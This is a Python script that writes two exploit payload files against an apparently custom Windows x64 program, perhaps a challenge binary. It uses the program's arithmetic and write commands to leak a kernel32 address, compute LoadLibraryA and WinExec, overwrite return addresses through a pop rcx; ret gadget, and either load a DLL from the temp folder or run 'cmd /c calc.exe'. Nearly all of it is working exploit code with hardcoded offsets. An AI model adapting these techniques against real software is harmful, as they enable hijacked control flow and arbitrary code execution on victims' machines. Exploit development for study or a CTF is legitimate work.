import binascii

def write_bin(content, name):
	fd = open(name, 'wb')
	fd.write(content)
	fd.close()

def loadlib_exploit():
	#### exploit_01 return to loadlibrarya ####
	#you need to put a good dll in c:\%temp%\a.dll

	dir = 'C:\\Users\\jmitchell01\\Desktop\\tmp\\r9b\\'
	name = 'exploit_01.dat'

	#add the value at P_TWO to the value at P_ONE
	#rax = P_TWO
	#rdx = P_ONE
	#add qword ptr ds:[rdx],rax
	#P_ONE='43' # return addr
	#P_TWO='20' # zero
	#mov_stack = [ADD_CMD, P_ONE, P_TWO]
	ADD_CMD = '01'

	#sub the value at P_TWO from P_ONE keeping P_ONE
	#rax = P_TWO
	#rdx = P_ONE
	#sub qword ptr ds:[rdx],rax
	#P_ONE='43' #return addr
	#P_TWO='20' #zero
	#mov_stack = [SUB_CMD, P_ONE, P_TWO]
	SUB_CMD = '02'

	#move the value at P_TWO to the place at P_ONE
	#rax = P_TWO
	#rsp+rdx*8+50 = P_ONE
	#mov qword ptr ss:[rsp+rdx*8+50],rax
	#P_ONE='43' #return addr
	#P_TWO='20' #zero
	#mov_stack = [MOV_CMD, P_ONE, P_TWO]
	MOV_CMD = '03'

	#Write QWORD at a time to the place at P_ONE
	#rax = P_TWO
	#rsp+rcx*8+50 = P_ONE
	#mov qword ptr ss:[rsp+rcx*8+50],rax
	#P_ONE='14' # slack space
	#P_TWO='2020202030303030' # value to write
	#mov_stack = [WRITE_CMD, P_ONE, P_TWO]
	WRITE_CMD = '00'

	#steal a k32 addr and put it at position 10
	#return to kernel32.00007FFDC8963034
	P_ONE = '10'
	P_TWO = '4b'
	mov_k32_ptr = [MOV_CMD, P_ONE, P_TWO]
	sploit = ''.join(mov_k32_ptr)

	#write the difference between the k32 pointer and 
	#loadlibrarya to position 11
	#00007FFDC8963034 - 00007FFDC6B11C20 (loadlibrarya) = 1E51414
	P_ONE = '11'
	P_TWO = '1414e501'+'00000000' #01E51414
	write_diff = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(write_diff)

	#subtract position 11 from position 10 store in position 10
	#this gives us the addr of loadlibrarya
	P_ONE = '10'
	P_TWO = '11'
	sub_for_ll = [SUB_CMD, P_ONE, P_TWO]
	sploit += ''.join(sub_for_ll)

	#overwrite return address at offset 45 (from pop rcx ret)
	#with loadlibrarya
	P_ONE = '45'
	P_TWO = '10'
	pop_to_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(pop_to_ret)

	#write dll path
	#c:\%temp%\a.dll
	P_ONE = '00'
	P_TWO = '433A5C2554454D50'
	dll_path = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(dll_path)
	P_ONE = '01'
	P_TWO = '255C612E646C6C00'
	dll_path = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(dll_path)

	#mov pointer at position 3f to position 42 
	P_ONE = '44'
	P_TWO = '3f'
	ll_arg = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(ll_arg)

	#steal current ret addr and put it at postition 12
	P_ONE = '12'
	P_TWO = '43'
	mov_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(mov_ret)

	#write difference between current ret and pop rcx ret
	#0000000140005FF4 - 000000014000F600 = -960c	
	#new return address 
	#000000014000F600 | 59                       | pop rcx                                                    |
	#000000014000F601 | C3                       | ret                                                        |
	#

	P_ONE = '13'
	P_TWO = '0c960000'+'00000000' #960c
	write_diff = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(write_diff)

	#add difference to ret adder to get new ret
	P_ONE = '12'
	P_TWO = '13'
	add_ret = [ADD_CMD, P_ONE, P_TWO]
	sploit += ''.join(add_ret)

	#overwrite current ret with new ret addr
	P_ONE = '43'
	P_TWO = '12'
	mov_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(mov_ret)


	#hex it up and write it
	sploit = binascii.unhexlify(sploit)
	write_bin(sploit, name)


def winexec_exploit():
	#exploit_02 use string kernel32.winexec @rcx cmd /c calc.exe 	

	dir = 'C:\\Users\\jmitchell01\\Desktop\\tmp\\r9b\\'
	name = 'exploit_02.dat'

	#add the value at P_TWO to the value at P_ONE
	#rax = P_TWO
	#rdx = P_ONE
	#add qword ptr ds:[rdx],rax
	#P_ONE='43' # return addr
	#P_TWO='20' # zero
	#mov_stack = [ADD_CMD, P_ONE, P_TWO]
	ADD_CMD = '01'

	#sub the value at P_TWO from P_ONE keeping P_ONE
	#rax = P_TWO
	#rdx = P_ONE
	#sub qword ptr ds:[rdx],rax
	#P_ONE='43' #return addr
	#P_TWO='20' #zero
	#mov_stack = [SUB_CMD, P_ONE, P_TWO]
	SUB_CMD = '02'

	#move the value at P_TWO to the place at P_ONE
	#rax = P_TWO
	#rsp+rdx*8+50 = P_ONE
	#mov qword ptr ss:[rsp+rdx*8+50],rax
	#P_ONE='43' #return addr
	#P_TWO='20' #zero
	#mov_stack = [MOV_CMD, P_ONE, P_TWO]
	MOV_CMD = '03'

	#Write QWORD at a time to the place at P_ONE
	#rax = P_TWO
	#rsp+rcx*8+50 = P_ONE
	#mov qword ptr ss:[rsp+rcx*8+50],rax
	#P_ONE='14' # slack space
	#P_TWO='2020202030303030' # value to write
	#mov_stack = [WRITE_CMD, P_ONE, P_TWO]
	WRITE_CMD = '00'

	#steal a exe ptr and put it at position 10
	#return to 
	P_ONE = '10'
	P_TWO = '43'
	mov_k32_ptr = [MOV_CMD, P_ONE, P_TWO]
	sploit = ''.join(mov_k32_ptr)

	#write the difference between the exe pointer and 
	#0000000140002118  call qword ptr ds:[<&WinExec>]  to position 11
	#0000000140005FF4 -  0000000140002118 (winexec) = 3EDC
	P_ONE = '11'
	P_TWO = 'dc3e0000'+'00000000' #3edc
	write_diff = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(write_diff)

	#sub position 11 to position 10 store in position 10
	#this gives us the addr of call winexec
	P_ONE = '10'
	P_TWO = '11'
	add_for_we = [SUB_CMD, P_ONE, P_TWO]
	sploit += ''.join(add_for_we)

	#overwrite return address at offset 45 (from pop rcx ret)
	#with winexec
	P_ONE = '45'
	P_TWO = '10'
	pop_to_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(pop_to_ret)

	#write winexec command
	#cmd /c calc.exe
	P_ONE = '00'
	P_TWO = '636d64202f632063'
	dll_path = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(dll_path)
	P_ONE = '01'
	P_TWO = '616c632e65786500'
	dll_path = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(dll_path)

	#mov pointer at position 3f to position 42 
	P_ONE = '44'
	P_TWO = '3f'
	ll_arg = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(ll_arg)

	#steal current ret addr and put it at postition 12
	P_ONE = '12'
	P_TWO = '43'
	mov_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(mov_ret)

	#write difference between current ret and pop rcx ret
	#0000000140005FF4 - 000000014000F600 = -960c	
	#new return address 
	#000000014000F600 | 59                       | pop rcx                                                    |
	#000000014000F601 | C3                       | ret                                                        |
	#

	P_ONE = '13'
	P_TWO = '0c960000'+'00000000' #960c
	write_diff = [WRITE_CMD, P_ONE, P_TWO]
	sploit += ''.join(write_diff)

	#add difference to ret adder to get new ret
	P_ONE = '12'
	P_TWO = '13'
	add_ret = [ADD_CMD, P_ONE, P_TWO]
	sploit += ''.join(add_ret)

	#overwrite current ret with new ret addr
	P_ONE = '43'
	P_TWO = '12'
	mov_ret = [MOV_CMD, P_ONE, P_TWO]
	sploit += ''.join(mov_ret)


	#hex it up and write it
	sploit = binascii.unhexlify(sploit)
	write_bin(sploit, name)

if __name__ == '__main__':
	loadlib_exploit()
	winexec_exploit()
